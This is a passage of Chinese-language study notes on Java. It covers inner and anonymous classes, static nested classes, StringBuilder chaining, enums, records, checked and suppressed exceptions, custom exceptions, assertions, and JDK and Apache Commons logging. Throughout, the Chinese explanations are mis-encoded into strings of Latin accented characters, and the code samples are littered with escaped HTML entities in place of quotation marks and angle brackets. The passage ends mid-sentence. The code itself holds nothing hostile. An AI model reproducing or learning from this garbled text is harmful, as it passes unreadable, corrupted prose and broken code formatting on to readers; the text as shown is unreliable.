æŠŠæ–¹æ³•å®šä¹‰ä¸ºpackageæƒé™æœ‰åŠ©äºæµ‹è¯•ï¼Œå› ä¸ºæµ‹è¯•ç±»å’Œè¢«æµ‹è¯•ç±»åªè¦ä½äºåŒä¸€ä¸ªpackageï¼Œæµ‹è¯•ä»£ç å°±å¯ä»¥è®¿é—®è¢«æµ‹è¯•ç±»çš„packageæƒé™æ–¹æ³• å†…éƒ¨ç±» æˆ–ç§°nested classåµŒå¥—ç±» Inner Classå®šä¹‰åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨ï¼Œå®ƒçš„å®ä¾‹ä¸èƒ½å•ç‹¬å­˜åœ¨ public class Main { public static void main(String[] args) { Outer outer = new Outer(\u0026#34;Nested\u0026#34;); // å®ä¾‹åŒ–ä¸€ä¸ªOuter Outer.Inner inner = outer.new Inner(); // å®ä¾‹åŒ–ä¸€ä¸ªInner inner.hello(); } } class Outer { private String name; Outer(String name) {\t// è°ƒç”¨Outerçš„æ„é€ æ–¹æ³•æ¥åˆ›å»ºInnerå®ä¾‹ this.name = name; } class Inner { void hello() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.this.name); } } } åŸå› æ˜¯Inner Classé™¤äº†thisæŒ‡å‘è‡ªå·±ä»¥å¤–è¿˜éšå«åœ°æŒæœ‰ä¸€ä¸ªOuter Classå®ä¾‹ï¼Œå¯ä»¥ç”¨Outer.thisè®¿é—®è¿™ä¸ªå®ä¾‹ï¼›æ‰€ä»¥ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªInner Classä¸èƒ½è„±ç¦»Outerå®ä¾‹\nInner Classå’Œæ™®é€šClassç›¸æ¯”ï¼Œé™¤äº†èƒ½å¼•ç”¨Outerå®ä¾‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„ç‰¹æƒï¼šå¯ä»¥ä¿®æ”¹Outer Classçš„privateå­—æ®µï¼›å› ä¸ºInner Classçš„ä½œç”¨åŸŸåœ¨Outer Classå†…éƒ¨ï¼Œæ‰€ä»¥èƒ½è®¿é—®Outer Classçš„privateå­—æ®µå’Œæ–¹æ³•\nè§‚å¯ŸJavaç¼–è¯‘å™¨ç¼–è¯‘åçš„.classæ–‡ä»¶å¯ä»¥å‘ç°ï¼ŒOuterç±»è¢«ç¼–è¯‘ä¸ºOuter.classï¼Œè€ŒInnerç±»è¢«ç¼–è¯‘ä¸ºOuter$Inner.class\nè¿˜å¯ä»¥é€šè¿‡åŒ¿åç±»Anonymous Classæ¥å®šä¹‰Inner Classï¼Œä¸¤è€…æœ¬è´¨ä¸Šç›¸åŒ public class Main { public static void main(String[] args) { Outer outer = new Outer(\u0026#34;Nested\u0026#34;); outer.asyncHello(); } } class Outer { private String name; Outer(String name) { this.name = name; } void asyncHello() { Runnable r = new Runnable() {\t// @Override public void run() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.this.name); } }; new Thread(r).start(); } } Runnabaleæœ¬èº«æ˜¯ä¸èƒ½å®ä¾‹åŒ–çš„æ¥å£ï¼Œè¿™é‡Œå®é™…å®šä¹‰äº†ä¸€ä¸ªå®ç°äº†Runnableæ¥å£çš„åŒ¿åç±»ï¼Œå¹¶é€šè¿‡newå®ä¾‹åŒ– ä¹‹åè½¬å‹ä¸ºRunnableï¼Œè¿‡ç¨‹å¾ˆå¤šä½†æ˜¯å®ç°èµ·æ¥ä»£ç å¾ˆç®€æ´ï¼›å’ŒInner Classä¸€æ ·ä¹Ÿå¯ä»¥è®¿é—®Outer Classçš„private\nåŒ¿åç±»åœ¨å®šä¹‰æ—¶å¿…é¡»å®ä¾‹åŒ–ï¼Œæœ€ç»ˆä¼šç¼–è¯‘ä¸ºOuter$1.class Runnable r = new Runnable(){ // å®ç°å¿…è¦çš„æŠ½è±¡æ–¹æ³•... }; ç»§æ‰¿è‡ªæ™®é€šç±»çš„åŒ¿åç±»ï¼Œç¼–è¯‘ä¸ºMain$1.classå’ŒMain$2.classä¸¤ä¸ªåŒ¿åç±»æ–‡ä»¶ import java.util.HashMap; public class Main { public static void main(String[] args) { HashMap\u0026lt;String, String\u0026gt; map1 = new HashMap\u0026lt;\u0026gt;(); HashMap\u0026lt;String, String\u0026gt; map2 = new HashMap\u0026lt;\u0026gt;() {}; // åŒ¿åç±»! HashMap\u0026lt;String, String\u0026gt; map3 = new HashMap\u0026lt;\u0026gt;() { { put(\u0026#34;A\u0026#34;, \u0026#34;1\u0026#34;); put(\u0026#34;B\u0026#34;, \u0026#34;2\u0026#34;); } }; System.out.println(map3.get(\u0026#34;A\u0026#34;)); } } é™æ€å†…éƒ¨ç±»ç¤ºä¾‹ public class Main { public static void main(String[] args) { Outer.StaticNested sn = new Outer.StaticNested(); sn.hello(); } } class Outer { private static String NAME = \u0026#34;OUTER\u0026#34;; private String name; Outer(String name) { this.name = name; } static class StaticNested { void hello() { System.out.println(\u0026#34;Hello, \u0026#34; + Outer.NAME); } } } ç”¨staticä¿®é¥°çš„å†…éƒ¨ç±»å’ŒInner Classæœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå®ƒä¸å†ä¾é™„äºOuterçš„å®ä¾‹ï¼Œè€Œæ˜¯ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ç±»ï¼Œå› æ­¤æ— æ³•å¼•ç”¨Outer.thisï¼Œä½†å®ƒä»ç„¶å¯ä»¥è®¿é—®Outerçš„privateé™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼›å¦‚æœæŠŠStaticNestedç§»åˆ°Outerä¹‹å¤–ï¼Œå°±å¤±å»äº†è®¿é—®privateçš„æƒé™\nJavaæ ¸å¿ƒç±»(éƒ¨åˆ†) StringBuilder æ˜¯ä¸€ä¸ªå¯å˜å¯¹è±¡ï¼Œå¯ä»¥é¢„åˆ†é…ç¼“å†²åŒºï¼Œå‘å…¶ä¸­æ–°å¢å­—ç¬¦æ—¶ï¼Œä¸ä¼šåˆ›å»ºæ–°çš„ä¸´æ—¶å¯¹è±¡ StringBuilder sb = new StringBuilder(1024); for (int i = 0; i \u0026lt; 1000; i++) { sb.append(\u0026#39;,\u0026#39;); sb.append(i); } String s = sb.toString(); å¯é“¾å¼æ“ä½œ public class Main { public static void main(String[] args) { var sb = new StringBuilder(1024); sb.append(\u0026#34;Mr \u0026#34;) .append(\u0026#34;Bob\u0026#34;) .append(\u0026#34;!\u0026#34;) .insert(0, \u0026#34;Hello, \u0026#34;); System.out.println(sb.toString()); } } å®ç°çš„å…³é”®æ˜¯å®šä¹‰çš„append()æ–¹æ³•ä¼šè¿”å›thisï¼Œè¿™æ ·å°±å¯ä»¥ä¸æ–­è°ƒç”¨è‡ªèº«çš„å…¶ä»–æ–¹æ³•ï¼›ä»¿å†™é“¾å¼è°ƒç”¨å‡½æ•° public class Main { public static void main(String[] args) { Adder adder = new Adder(); adder.add(3) .add(5) .inc() .add(10); System.out.println(adder.value()); } } class Adder { private int sum = 0; public Adder add(int n) { sum += n; return this; } public Adder inc() { sum ++; return this; } public int value() { return sum; } } StringBufferå’ŒStringBuilderæ¥å£å®Œå…¨ç›¸åŒï¼Œæ˜¯æ—©æœŸç‰ˆæœ¬ï¼Œé€šè¿‡åŒæ­¥æ¥ä¿è¯å¤šä¸ªçº¿ç¨‹æ“ä½œStringBufferä¹Ÿæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯åŒæ­¥ä¼šå¸¦æ¥æ‰§è¡Œé€Ÿåº¦çš„ä¸‹é™ enum public class Main { public static void main(String[] args) { Weekday day = Weekday.SUN; if (day == Weekday.SAT || day == Weekday.SUN) { System.out.println(\u0026#34;Work at home!\u0026#34;); } else { System.out.println(\u0026#34;Work at office!\u0026#34;); } } } enum Weekday {\t// åªéœ€ä¾æ¬¡åˆ—å‡ºæšä¸¾çš„å¸¸é‡å SUN, MON, TUE, WED, THU, FRI, SAT; } enumå¸¸é‡æœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼Œå³Weekday.SUNç±»å‹æ˜¯Weekdayï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨æ£€æŸ¥å‡ºç±»å‹é”™è¯¯\nä¸å¯èƒ½å¼•ç”¨åˆ°éæšä¸¾çš„å€¼ï¼Œå› ä¸ºæ— æ³•é€šè¿‡ç¼–è¯‘\nä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½äº’ç›¸æ¯”è¾ƒæˆ–è€…èµ‹å€¼ï¼Œå› ä¸ºç±»å‹ä¸ç¬¦\nenumè™½ç„¶ä¹Ÿæ˜¯å¼•ç”¨ç±»å‹ï¼Œä½†å› ä¸ºå…¶åœ¨JVMä¸­åªæœ‰å”¯ä¸€å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨==æ¯”è¾ƒ\nç»§æ‰¿è‡ªjava.lang.Enumï¼Œæ— æ³•è¢«ç»§æ‰¿ï¼Œæ— æ³•newå®ä¾‹\næšä¸¾ç±»çš„å­—æ®µä¹Ÿå¯ä»¥æ˜¯éfinalç±»å‹ï¼Œå³å¯ä»¥åœ¨è¿è¡ŒæœŸä¿®æ”¹ï¼Œä½†æ˜¯ä¸æ¨èè¿™æ ·\nå¤©ç”Ÿé€‚åˆswitchï¼Œå…·æœ‰ç±»å‹ä¿¡æ¯å’Œæœ‰é™ä¸ªæšä¸¾å¸¸é‡\npublic class Main { public static void main(String[] args) { Weekday day = Weekday.SUN; switch(day) { case MON: case TUE: case WED: case THU: case FRI: System.out.println(\u0026#34;Today is \u0026#34; + day + \u0026#34;. Work at office!\u0026#34;); break; case SAT: case SUN: System.out.println(\u0026#34;Today is \u0026#34; + day + \u0026#34;. Work at home!\u0026#34;); break; default: throw new RuntimeException(\u0026#34;cannot process \u0026#34; + day); } } } enum Weekday { MON, TUE, WED, THU, FRI, SAT, SUN; } record java14å¼€å§‹\nä¸å˜ç±»çš„classå’Œå­—æ®µéƒ½ä½¿ç”¨finalå…³é”®å­—ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±»ï¼Œåˆ›å»ºå®ä¾‹åæ— æ³•ä¿®æ”¹ä»»ä½•å­—æ®µ åˆ›å»ºä¸å˜ç±»åä¸ºäº†ä¿è¯ä¸å˜ç±»çš„æ¯”è¾ƒï¼Œè¿˜éœ€è¦æ­£ç¡®è¦†å†™equals()å’ŒhashCode()æ–¹æ³•ï¼Œæ‰‹åŠ¨è¦†å†™å¾ˆéº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥ç”¨recordä¸€è¡Œå†™å‡ºä¸å˜ç±» public final class Point { private final int x; private final int y; public Point(int x, int y) { this.x = x; this.y = y; } public int x() { return this.x; } public int y() { return this.y; } } public class Main { public static void main(String[] args) { Point p = new Point(123, 456); System.out.println(p.x()); System.out.println(p.y()); System.out.println(p); } } public record Point(int x, int y) {} æœ€åä¸€è¡Œç›¸å½“äº\npublic final class Point extends Record { private final int x; private final int y; public Point(int x, int y) { this.x = x; this.y = y; } public int x() { return this.x; } public int y() { return this.y; } public String toString() { return String.format(\u0026#34;Point[x=%s, y=%s]\u0026#34;, x, y); } public boolean equals(Object o) { ... } public int hashCode() { ... } } é™¤äº†ç”¨finalä¿®é¥°classä»¥åŠæ¯ä¸ªå­—æ®µå¤–ï¼Œç¼–è¯‘å™¨è¿˜è‡ªåŠ¨ä¸ºæˆ‘ä»¬åˆ›å»ºäº†æ„é€ æ–¹æ³•ï¼Œå’Œå­—æ®µååŒåçš„æ–¹æ³•ï¼Œä»¥åŠè¦†å†™toString()ã€equals()å’ŒhashCode()æ–¹æ³•\nå’Œenumç±»ä¼¼ï¼Œæˆ‘ä»¬è‡ªå·±ä¸èƒ½ç›´æ¥ä»Recordæ´¾ç”Ÿï¼Œåªèƒ½é€šè¿‡recordå…³é”®å­—ç”±ç¼–è¯‘å™¨å®ç°ç»§æ‰¿ å¦‚æœè¦å¯¹å‚æ•°è¿›è¡Œæ£€æŸ¥ï¼Œå¯ä»¥ç”¨Compact Constructor public record Point(int x, int y) { public Point { if (x \u0026lt; 0 || y \u0026lt; 0) { throw new IllegalArgumentException(); } } } ç¼–è¯‘å™¨ç”Ÿæˆçš„æ–¹æ³•\npublic final class Point extends Record { public Point(int x, int y) { // è¿™æ˜¯æˆ‘ä»¬ç¼–å†™çš„Compact Constructor: if (x \u0026lt; 0 || y \u0026lt; 0) { throw new IllegalArgumentException(); } // è¿™æ˜¯ç¼–è¯‘å™¨ç»§ç»­ç”Ÿæˆçš„èµ‹å€¼ä»£ç : this.x = x; this.y = y; } ... } ä½œä¸ºrecordçš„Pointä»ç„¶å¯ä»¥é€šè¿‡of()æ·»åŠ é™æ€æ–¹æ³• public record Point(int x, int y) { public static Point of() { return new Point(0, 0); } public static Point of(int x, int y) { return new Point(x, y); } } var z = Point.of(); var p = Point.of(123, 456); å¼‚å¸¸å¤„ç† å¼‚å¸¸\u0026amp;æ•è·å¼‚å¸¸ Javaå†…ç½®å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œæ˜¯ä¸€ç§classï¼Œæœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼›å¼‚å¸¸å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹æŠ›å‡ºï¼Œä½†åªéœ€è¦åœ¨ä¸Šå±‚æ•è·ï¼Œè¿™æ ·å¯ä»¥åšåˆ°å’Œæ–¹æ³•è°ƒç”¨åˆ†ç¦» try { String s = processFile(â€œC:\\\\test.txtâ€); // ok: } catch (FileNotFoundException e) { // file not found: } catch (SecurityException e) { // no read permission: } catch (IOException e) { // io error: } catch (Exception e) { // other error: } ç»§æ‰¿å…³ç³»æ˜¯è¿™æ ·çš„ Throwableæ˜¯å¼‚å¸¸ä½“ç³»çš„æ ¹ï¼Œå®ƒç»§æ‰¿è‡ªObject\nErrorè¡¨ç¤ºä¸¥é‡é”™è¯¯ï¼Œæ¯”å¦‚OutofMemoryError, NoClassDefFoundError, StackOverflowError\nExceptionè¡¨ç¤ºè¿è¡Œæ—¶çš„å¼‚å¸¸ï¼Œå¯ä»¥è¢«æ•è·å¹¶å¤„ç†ï¼Œæ¯”å¦‚NumberFormatException, FileNotFoundException, SocketExceptionï¼›è¿˜åŒ…æ‹¬ä¸€äº›å¯ä¿®æ­£çš„è¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚NullPointerException, IndexOutOfBoundsException\nå¸¸ç”¨å¼‚å¸¸ Exception â”‚ â”œâ”€ RuntimeException â”‚ â”‚ â”‚ â”œâ”€ NullPointerException â”‚ â”‚ â”‚ â”œâ”€ IndexOutOfBoundsException â”‚ â”‚ â”‚ â”œâ”€ SecurityException â”‚ â”‚ â”‚ â””â”€ IllegalArgumentException â”‚ â”‚ â”‚ â””â”€ NumberFormatException â”‚ â”œâ”€ IOException â”‚ â”‚ â”‚ â”œâ”€ UnsupportedCharsetException â”‚ â”‚ â”‚ â”œâ”€ FileNotFoundException â”‚ â”‚ â”‚ â””â”€ SocketException â”‚ â”œâ”€ ParseException â”‚ â”œâ”€ GeneralSecurityException â”‚ â”œâ”€ SQLException â”‚ â””â”€ TimeoutException å¿…é¡»æ•è·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬ExceptionåŠå…¶å­ç±»ï¼Œä½†ä¸åŒ…æ‹¬RuntimeExceptionåŠå…¶å­ç±»ï¼Œè¿™ç§ç±»å‹çš„å¼‚å¸¸ç§°ä¸ºChecked Exception\nå¦‚æœä¸æ•è·Checked Exceptionï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼ŒåŸå› æ˜¯æ–¹æ³•å®šä¹‰æ—¶ä½¿ç”¨throws Xxxè¡¨ç¤ºè¯¥æ–¹æ³•å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ç±»å‹ï¼Œå¯¼è‡´è°ƒç”¨æ–¹åœ¨è°ƒç”¨çš„æ—¶å€™ï¼Œå¿…é¡»å¼ºåˆ¶æ•è·è¿™äº›å¼‚å¸¸\nä¸éœ€è¦æ•è·çš„å¼‚å¸¸ï¼ŒåŒ…æ‹¬ErroråŠå…¶å­ç±»ï¼ŒRuntimeExceptionåŠå…¶å­ç±»\næ•è·å¼‚å¸¸éœ€è¦æå‰import\nimport java.io.UnsupportedEncodingException; import java.util.Arrays; public class Main { public static void main(String[] args) { try { byte[] bs = toGBK(\u0026#34;ä¸­æ–‡\u0026#34;); System.out.println(Arrays.toString(bs)); } catch (UnsupportedEncodingException e) { System.out.println(e); } } static byte[] toGBK(String s) throws UnsupportedEncodingException { // ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]: return s.getBytes(\u0026#34;GBK\u0026#34;); } } åªè¦æ˜¯æ–¹æ³•å£°æ˜çš„Checked Exceptionï¼Œä¸åœ¨è°ƒç”¨å±‚æ•è·ï¼Œä¹Ÿå¿…é¡»åœ¨æ›´é«˜çš„è°ƒç”¨å±‚æ•è·ï¼›æ‰€æœ‰æœªæ•è·çš„å¼‚å¸¸ï¼Œæœ€ç»ˆä¹Ÿå¿…é¡»åœ¨main()æ–¹æ³•ä¸­æ•è· æ‰€æœ‰å¼‚å¸¸éƒ½å¯ä»¥è°ƒç”¨printStackTrace()æ–¹æ³•æ‰“å°å¼‚å¸¸æ ˆ static byte[] toGBK(String s) { try { return s.getBytes(\u0026#34;GBK\u0026#34;); } catch (UnsupportedEncodingException e) { // å…ˆè®°ä¸‹æ¥å†è¯´: e.printStackTrace(); } return null; å¦‚æœä¸æƒ³ç”¨tryå¯ä»¥ç›´æ¥æŠŠmain()æ–¹æ³•å®šä¹‰ä¸ºthrows Exception import java.io.UnsupportedEncodingException; import java.util.Arrays; public class Main { public static void main(String[] args) throws Exception { byte[] bs = toGBK(\u0026#34;ä¸­æ–‡\u0026#34;); System.out.println(Arrays.toString(bs)); } static byte[] toGBK(String s) throws UnsupportedEncodingException { // ç”¨æŒ‡å®šç¼–ç è½¬æ¢Stringä¸ºbyte[]: return s.getBytes(\u0026#34;GBK\u0026#34;); } } ç›¸å½“äºå£°æ˜äº†æ‰€æœ‰å¯èƒ½æŠ›å‡ºçš„Exceptionï¼Œä¹Ÿå°±ä¸ç”¨æ•è·äº†ï¼›ä»£ä»·å°±æ˜¯ä¸€æ—¦å‘ç”Ÿå¼‚å¸¸ï¼Œç¨‹åºä¼šç«‹åˆ»é€€å‡ºï¼Œä¸å¤Ÿçµæ´»\nå½“æ–¹æ³•å£°æ˜äº†å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå¯ä»¥æ²¡æœ‰catchï¼Œåªä½¿ç”¨try ... finallyç»“æ„ void process(String file) throws IOException { try { ... } finally { System.out.println(\u0026#34;END\u0026#34;); } } å¯ä»¥ä¸€ä¸ªtryå¯¹å¤šä¸ªcatchï¼Œæ­¤æ—¶æ³¨æ„catchçš„é¡ºåºï¼šå­ç±»åœ¨å‰ï¼Œé¿å…çŸ­è·¯ public static void main(String[] args) { try { process1(); process2(); process3(); } catch (IOException e) { System.out.println(\u0026#34;IO error\u0026#34;); } catch (UnsupportedEncodingException e) { // æ°¸è¿œæ•è·ä¸åˆ° ä¼šè¢«ä¸Šé¢çš„æˆªèƒ¡ System.out.println(\u0026#34;Bad encoding\u0026#34;); } } æŠ›å‡ºå¼‚å¸¸ åˆ†ä¸¤æ­¥ï¼šåˆ›å»ºæŸä¸ªExceptionçš„å®ä¾‹ -\u0026gt; æŠ›å‡º void process2(String s) { if (s==null) { throw new NullPointerException(); } } å¦‚æœä¸€ä¸ªæ–¹æ³•æ•è·äº†æŸä¸ªå¼‚å¸¸åï¼Œåˆåœ¨catchå­å¥ä¸­æŠ›å‡ºæ–°çš„å¼‚å¸¸ï¼Œå°±ç›¸å½“äºæŠŠæŠ›å‡ºçš„å¼‚å¸¸ç±»å‹â€œè½¬æ¢â€äº†ï¼›æ³¨æ„ä¸ºäº†èƒ½è¿½è¸ªåˆ°å®Œæ•´çš„å¼‚å¸¸æ ˆï¼Œåœ¨æ„é€ å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹çš„Exceptionå®ä¾‹ä¼ è¿›å» public class Main { public static void main(String[] args) { try { process1();\t// 01 } catch (Exception e) { e.printStackTrace();\t// 05 } } static void process1() { try { process2();\t// 02 } catch (NullPointerException e) { // throw new IllegalArgumentException(); throw new IllegalArgumentException(e);\t// 04 } } static void process2() { throw new NullPointerException();\t// 03 } } å¦‚æœç”¨æ³¨é‡Šæ‰çš„æ–¹å¼å†™å°±ä¼šä¸¢å¤±NullPointerExceptionè¿™ä¸€æ¡\nåœ¨ä»£ç ä¸­è·å–åŸå§‹å¼‚å¸¸å¯ä»¥ä½¿ç”¨Throwable.getCause()æ–¹æ³•ã€‚å¦‚æœè¿”å›nullï¼Œè¯´æ˜å·²ç»æ˜¯â€œæ ¹å¼‚å¸¸â€äº†(Caused by: xxxx) å¦‚æœåœ¨finallyä¸­æŠ›å‡ºå¼‚å¸¸ï¼ˆå°½é‡åˆ«ï¼‰ï¼Œç”±äºcatchä¸­å‡†å¤‡æŠ›å‡ºçš„å¼‚å¸¸å°±â€œæ¶ˆå¤±â€äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ²¡æœ‰è¢«æŠ›å‡ºçš„å¼‚å¸¸ç§°ä¸ºâ€œè¢«å±è”½â€çš„å¼‚å¸¸Suppressed Exception å¦‚æœæˆ‘ä»¬éœ€è¦è·çŸ¥æ‰€æœ‰çš„å¼‚å¸¸ï¼Œå¯ä»¥å…ˆç”¨originå˜é‡ä¿å­˜åŸå§‹å¼‚å¸¸ï¼Œç„¶åè°ƒç”¨Throwable.addSuppressed()ï¼ŒæŠŠåŸå§‹å¼‚å¸¸æ·»åŠ è¿›æ¥ï¼Œæœ€ååœ¨finallyæŠ›å‡º public class Main { public static void main(String[] args) throws Exception { Exception origin = null; try { System.out.println(Integer.parseInt(\u0026#34;abc\u0026#34;)); } catch (Exception e) { origin = e; throw e; } finally { Exception e = new IllegalArgumentException(); if (origin != null) { e.addSuppressed(origin); } throw e; } } } å½“catchå’Œfinallyéƒ½æŠ›å‡ºäº†å¼‚å¸¸æ—¶ï¼Œè™½ç„¶catchçš„å¼‚å¸¸è¢«å±è”½äº†ï¼Œä½†æ˜¯ï¼ŒfinallyæŠ›å‡ºçš„å¼‚å¸¸ä»ç„¶åŒ…å«äº†å®ƒï¼š\nException in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException at Main.main(Main.java:11) Suppressed: java.lang.NumberFormatException: For input string: \u0026#34;abc\u0026#34; at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.base/java.lang.Integer.parseInt(Integer.java:652) at java.base/java.lang.Integer.parseInt(Integer.java:770) at Main.main(Main.java:6) é€šè¿‡Throwable.getSuppressed()å¯ä»¥è·å–æ‰€æœ‰çš„Suppressed Exception\nè‡ªå®šä¹‰å¼‚å¸¸ è§çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ªBaseExceptionä½œä¸ºâ€œæ ¹å¼‚å¸¸â€ï¼Œç„¶åï¼Œæ´¾ç”Ÿå‡ºå„ç§ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸ï¼›BaseExceptionéœ€è¦ä»ä¸€ä¸ªé€‚åˆçš„Exceptionæ´¾ç”Ÿï¼Œé€šå¸¸å»ºè®®ä»RuntimeExceptionæ´¾ç”Ÿ public class BaseException extends RuntimeException { } public class UserNotFoundException extends BaseException { } public class LoginFailedException extends BaseException { } è‡ªå®šä¹‰çš„BaseExceptionåº”è¯¥æä¾›å¤šä¸ªæ„é€ æ–¹æ³• public class BaseException extends RuntimeException { public BaseException() { super(); } public BaseException(String message, Throwable cause) { super(message, cause); } public BaseException(String message) { super(message); } public BaseException(Throwable cause) { super(cause); } } è¿™æ ·ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€‰æ‹©åˆé€‚çš„æ„é€ æ–¹æ³•\næ–­è¨€ JVMé»˜è®¤å…³é—­æ–­è¨€æŒ‡ä»¤ï¼Œéœ€ä¼ å…¥-enableassertionsæˆ–-eaï¼›è¿˜å¯ä»¥æœ‰é€‰æ‹©åœ°å¯¹ç‰¹å®šåœ°ç±»å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š-ea:com.itranswarp.sample.Mainï¼Œè¡¨ç¤ºåªå¯¹com.itranswarp.sample.Mainè¿™ä¸ªç±»å¯ç”¨æ–­è¨€ï¼›æˆ–è€…å¯¹ç‰¹å®šåœ°åŒ…å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š-ea:com.itranswarp.sample...ï¼ˆæ³¨æ„ç»“å°¾æœ‰3ä¸ª.ï¼‰ï¼Œè¡¨ç¤ºå¯¹com.itranswarp.sampleè¿™ä¸ªåŒ…å¯åŠ¨æ–­è¨€ æ˜¯ä¸€ç§è°ƒè¯•æ–¹å¼ï¼Œå¤±è´¥æ—¶ä¼šæŠ›å‡ºAssertionErrorï¼Œå¯¼è‡´ç¨‹åºç»“æŸé€€å‡º public static void main(String[] args) { double x = Math.abs(-123.45); assert x \u0026gt;= 0 : \u0026#34;x must \u0026gt;= 0\u0026#34;;\t// ä¼šå¸¦ä¸Šæ¶ˆæ¯ System.out.println(x); } ä¸èƒ½ç”¨äºå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œåªåº”è¯¥ç”¨äºå¼€å‘å’Œæµ‹è¯•é˜¶æ®µï¼Œå¯¹äºå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œä¸åº”è¯¥ä½¿ç”¨æ–­è¨€ void sort(int[] arr) { assert arr != null; } åº”è¯¥ç›´æ¥æ•è·äº†\nvoid sort(int[] arr) { if (arr == null) { throw new IllegalArgumentException(\u0026#34;array cannot be null\u0026#34;); } } æ—¥å¿— ä¸ºäº†å–ä»£System.out.println()ï¼Œå°è£…å¥½äº†å¾ˆå¤šå¥½ç”¨çš„æ–¹æ³•\nJDK Logging æ ‡å‡†åº“è‡ªå¸¦\nimport java.util.logging.Level; import java.util.logging.Logger; public class Hello { public static void main(String[] args) { Logger logger = Logger.getGlobal(); logger.info(\u0026#34;start process...\u0026#34;); logger.warning(\u0026#34;memory is running out...\u0026#34;); logger.fine(\u0026#34;ignored.\u0026#34;); logger.severe(\u0026#34;process will be terminated...\u0026#34;); } } JDKçš„Loggingå®šä¹‰äº†7ä¸ªæ—¥å¿—çº§åˆ«ï¼Œä»ä¸¥é‡åˆ°æ™®é€š SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST\nå±€é™ï¼šé…ç½®ä¸å¤ªæ–¹ä¾¿ï¼Œéœ€è¦åœ¨JVMå¯åŠ¨æ—¶ä¼ é€’å‚æ•°-Djava.util.logging.config.file=\u0026lt;config-file-name\u0026gt;ï¼Œä¸€æ—¦å¼€å§‹è¿è¡Œmain()æ–¹æ³•ï¼Œå°±æ— æ³•ä¿®æ”¹é…ç½® Commons Logging ç¬¬ä¸‰æ–¹ï¼Œç”±Apacheåˆ›å»ºï¼Œå¯ä»¥æŒ‚æ¥ä¸åŒçš„æ—¥å¿—ç³»ç»Ÿï¼Œå¹¶é€šè¿‡é…ç½®æ–‡ä»¶æŒ‡å®šæŒ‚æ¥çš„æ—¥å¿—ç³»ç»Ÿ\nå¯ä½œä¸ºæ—¥å¿—æ¥å£ï¼Œè€Œéæ—¥å¿—å®ç°\né»˜è®¤æœç´¢Log4jï¼Œæ²¡æœ‰çš„è¯ç”¨JDK Logging ä½¿ç”¨å¾ˆç®€å• import org.apache.commons.logging.Log; import org.apache.commons.logging.LogFactory; public class Main { public static void main(String[] args) { Log log = LogFactory.getLog(Main.class);\t// è·å–å®ä¾‹ log.info(\u0026#34;start...\u0026#34;);\t// æ‰“å°æ—¥å¿— log.warn(\u0026#34;end.\u0026#34;); } } 6ä¸ªæ—¥å¿—çº§åˆ« FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE\né™¤info(String)å¤–è¿˜æœ‰info(String, Throwable)è¿™æ ·ä¸€ä¸ªé‡è½½æ–¹æ³•ï¼Œä¾¿äºæ›´ç®€å•åœ°è®°å½•å¼‚å¸¸ try { ... } catch (Exception e) { log.error(\u0026#34;got exception!\u0026#34;, e); } å¦‚æœåœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨Logï¼Œé€šå¸¸ç›´æ¥å®šä¹‰ä¸€ä¸ªé™æ€ç±»å‹å˜é‡ï¼š // åœ¨é™æ€æ–¹æ³•ä¸­å¼•ç”¨Log: public class Main { static final Log log = LogFactory.getLog(Main.class); static void foo() { log.info(\u0026#34;foo\u0026#34;); } } åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨Logï¼Œé€šå¸¸å®šä¹‰ä¸€ä¸ªå®ä¾‹å˜é‡ // åœ¨å®ä¾‹æ–¹æ³•ä¸­å¼•ç”¨Log: public class Person { protected final Log log = LogFactory.getLog(getClass()); void foo() { log.info(\u0026#34;foo\u0026#34;); } } ä¸Šé¢å±•ç¤ºäº†ä¸¤ç§getLog()çš„æ–¹å¼ï¼Œç¬¬äºŒç§çš„å¥½å¤„æ˜¯å­ç±»å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥å®ä¾‹ï¼ŒåŸå› æ˜¯Javaçš„åŠ¨æ€ç‰¹æ€§ï¼Œå­ç±»è·å–çš„Logå­—æ®µå®é™…ä¸Šç›¸å½“äºLogFactory.getLog(Student.class)ï¼Œä½†å´æ˜¯ä»çˆ¶ç±»ç»§æ‰¿è€Œæ¥ï¼Œå¹¶ä¸”æ— 